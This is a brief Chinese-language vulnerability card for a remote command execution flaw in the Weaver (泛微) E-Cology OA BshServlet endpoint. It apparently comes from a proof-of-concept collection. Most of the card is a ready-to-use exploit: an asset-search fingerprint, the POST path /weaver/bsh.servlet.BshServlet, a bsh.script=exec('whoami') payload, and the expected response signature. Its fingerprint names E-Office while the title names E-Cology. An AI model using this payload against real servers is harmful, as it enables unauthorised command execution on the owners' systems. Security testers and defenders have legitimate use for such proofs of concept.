# 泛微E-Cologybsh.servlet.BshServletRCE漏洞

泛微OA ｜ 命令执行 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /weaver/bsh.servlet.BshServlet HTTP/1.1`

**Payload**
```
bsh.script=exec("whoami");&bsh.servlet.output=raw
```
- **响应特征**：200 system